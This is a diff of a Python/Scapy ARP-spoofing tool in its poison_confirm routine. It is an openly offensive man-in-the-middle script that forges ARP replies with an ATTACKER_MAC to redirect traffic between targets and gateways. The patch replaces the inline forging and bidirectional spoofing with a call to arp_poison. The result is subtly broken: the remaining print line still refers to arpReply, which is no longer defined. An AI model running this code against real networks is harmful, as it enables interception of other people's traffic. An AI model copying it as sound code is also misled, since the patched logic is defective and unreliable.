@@ -139,25 +139,9 @@ def poison_confirm(targets, gateways):
                 if(pkt[ARP].psrc == target.ip):
                     for gateway in gateways:
                         if(pkt[ARP].pdst == gateway.ip):
-                            echo = forge_l2_ping(gateway.ip, target.ip, target.mac)
-                                
-                            arpReply = forge_arp(gateway.ip, target.ip, target.mac, ATTACKER_MAC, 2)
-                            
-                            for i in range(3):
-                                sendp(echo, iface=options.iface, verbose=False)
-                                sendp(arpReply, iface=options.iface, verbose=False)
+                            arp_poison(targets, gateways)
                             print("ARP broadcast from " + arpReply[ARP].psrc + " to " + arpReply[ARP].pdst)
-                if(not options.oneway):
-                    if(pkt[ARP].pdst == target.ip):
-                        for gateway in gateways:
-                            if(pkt[ARP].psrc == gateway.ip):
-                                echo2 = forge_l2_ping(target.ip, gateway.ip, gateway.mac)
 
-                                arpReply = forge_arp(target.ip, gateway.ip, gateway.mac, ATTACKER_MAC, 2)
-
-                                for i in range(3):
-                                    sendp(echo2, iface=options.iface, verbose=False)
-                                    sendp(arpReply, iface=options.iface, verbose=False)
 
         # print("[*] Received ARP packet:")
         # pkt.show()
